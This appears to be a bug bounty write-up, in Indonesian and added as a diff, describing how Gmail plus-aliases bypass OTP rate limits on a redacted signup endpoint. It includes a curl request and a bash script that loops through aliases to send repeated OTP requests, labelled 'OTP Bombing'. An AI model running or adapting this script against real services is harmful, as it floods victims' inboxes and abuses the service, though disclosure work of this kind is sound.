@@ -1,0 +1,56 @@
+TITLE: [PRIVATE BUG BOUNTY] - improper email normalization allows otp flooding via gmail alias abuse
+Researcher: Willmet
+Date: 08/04/2025
+
+Simbol + pada gmail dianggap invalid.
+
+Oleh karna itu, saya mencoba membedah secara singkat pada website yang saya temukan,
+saya akan sensor dengan nama redacted.com
+
+Bagaimana aku meng-exploit nya?
+Endpoints: https://service.redacted.com/v1/otp/signup/email/_request
+Payload: {"email":"yourvalidgmail@gmail.com"}
+
+Gunakan curl:
+curl -X POST https://service.redacted.com/v1/otp/signup/email/_request \
+    -H "Content-Type: application/json" \
+    -d '{"email":"yourvalidgmail@gmail.com"}'
+
+Lalu saya mengoding sedikit bash script:
+
+
+#!/bin/bash
+
+BASE_EMAIL="yourvalidgmail@gmail.com"
+URL="https://service.redacted.com/v1/otp/signup/email/_request"
+UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0"
+
+echo "[*] Mulai OTP Bombing ke $BASE_EMAIL via alias abuse"
+
+for i in {1..10}; do
+  EMAIL_ALIAS="yourvalidgmail+spam$i@gmail.com"
+  echo "[+] Request OTP untuk $EMAIL_ALIAS"
+
+  RESP=$(curl -s -X POST "$URL" \
+    -H "Content-Type: application/json" \
+    -H "User-Agent: $UA" \
+    -d "{\"email\":\"$EMAIL_ALIAS\"}")
+
+  echo "$RESP"
+
+  OTP_KEY=$(echo "$RESP" | grep -oP '"otp_key":"\K[^"]+')
+  if [[ -n "$OTP_KEY" ]]; then
+    echo "[>] ✅ otp_key: $OTP_KEY"
+  else
+    echo "[!] ❌ Gagal dapat otp_key"
+  fi
+
+  sleep 1
+  echo "-----------------------------"
+done
+
+
+Yap OTP nya tetap akan terkirim ke "yourvalidgmail@gmail.com" meskipun dikirim ke "yourvalidgmail+spam1@gmail.com" dan seterusnya
+kenapa bisa begitu karena "+" tidak dianggap serta text dibelakangnya dianggap tidak ada oleh gmail atau sistem emailnya
+mereka akan tetap mendeteksi "yourvalidgmail@gmail.com" dan akhirnya bisa membypass rate limit yang sudah dibuat web developer tersebut.
+
